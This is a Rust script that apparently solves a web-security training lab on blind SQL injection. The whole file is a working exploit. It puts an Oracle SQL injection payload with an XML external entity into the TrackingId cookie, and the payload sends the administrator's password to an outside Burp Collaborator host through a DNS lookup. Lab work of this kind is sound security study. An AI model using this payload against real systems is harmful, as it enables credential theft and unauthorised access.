/****************************************************************************
*
* Lab: Blind SQL injection with out-of-band data exfiltration
*
* Hack Steps:
*      1. Inject payload into 'TrackingId' cookie to extract administrator
*         password via DNS lookup
*      2. Get the administrator password from your burp collaborator
*      3. Login as administrator
*
*****************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a7600130392e0e880582b7d00660053.web-security-academy.net";

// Change this to your burp collaborator domain
const BURP_COLLABORATOR: &str = "wrrnspxgnwjsdqhm4txiyp5dc4iv6lua.oastify.com";

fn main() {
    println!("⦗#⦘ Injection point: {}", "TrackingId".yellow());
    print!("❯❯ Injecting payload to extract administrator password via DNS lookup.. ");
    io::stdout().flush().unwrap();

    let payload = format!("'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://'||(select password from users where username = 'administrator')||'.{BURP_COLLABORATOR}/\"> %25remote%3b]>'),'/l') FROM dual)-- -");
    fetch_with_cookie("/filter?category=Pets", &payload);

    println!("{}", "OK".green());
    println!("🗹 Check your burp collaborator for the administrator password then login");
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch_with_cookie(path: &str, cookie: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("TrackingId={cookie}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}
